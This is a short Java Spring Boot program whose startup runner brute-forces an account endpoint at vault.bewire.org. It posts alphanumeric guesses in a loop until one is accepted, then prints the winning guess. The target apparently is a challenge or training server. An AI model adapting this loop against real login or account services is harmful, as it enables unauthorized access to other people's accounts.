package com.example.demo;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.web.client.RestTemplateBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

@SpringBootApplication
public class DemoApplication {
	private static final Logger log = LoggerFactory.getLogger(DemoApplication.class);

	public static void main(String[] args) {

		SpringApplication.run(DemoApplication.class, args);
	}
	@Bean
	public RestTemplate restTemplate(RestTemplateBuilder builder) {
		return builder.build();
	}

	@Bean
	public CommandLineRunner run(RestTemplate restTemplate) throws Exception {
		return args -> {
			//Bankrekening quote = restTemplate.getForObject(
			//		"http://vault.bewire.org/accounts/952f0ff3-a1f5-421e-934d-232e8454ff42", Bankrekening.class);
			//log.info(quote.toString());
			Bruteforcer bruteForcer = Bruteforcer.createAlphaNumericBruteForcer();
			ResponseEntity response = null;
			String brute = "";
			boolean loop = true;
			while(loop){
				try{
					brute = bruteForcer.computeNextCombination();
					response = restTemplate.postForObject("http://vault.bewire.org/accounts/952f0ff3-a1f5-421e-934d-232e8454ff42",new Answer(brute), ResponseEntity.class);
					loop = false;

				}catch(HttpClientErrorException e){

					System.out.println(e.getStatusCode());
				}
			}


			System.out.println(brute);
		};
	}
}
